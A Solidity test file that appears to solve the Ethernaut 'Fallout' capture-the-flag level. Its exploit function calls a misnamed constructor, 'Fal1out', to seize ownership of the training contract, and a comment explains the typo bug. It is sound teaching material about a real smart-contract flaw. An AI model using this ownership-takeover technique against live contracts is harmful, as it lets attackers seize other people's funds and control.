// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallout.sol";
import "src/levels/FalloutFactory.sol";

contract TestFallout is BaseTest {
    Fallout private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FalloutFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallout(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Before solidity 0.4.2 there was no constructor keyword in solidity so in order to make a constructor fn,
        // a fn should be defined with the same name as the name of the contract
        // In this challenge, there is a typo, instead of Fallout dev named it Fal1out
        // allowing the fn to be called unlimited number of times and claiming ownership of the contract
        level.Fal1out();

        vm.stopPrank();
    }
}
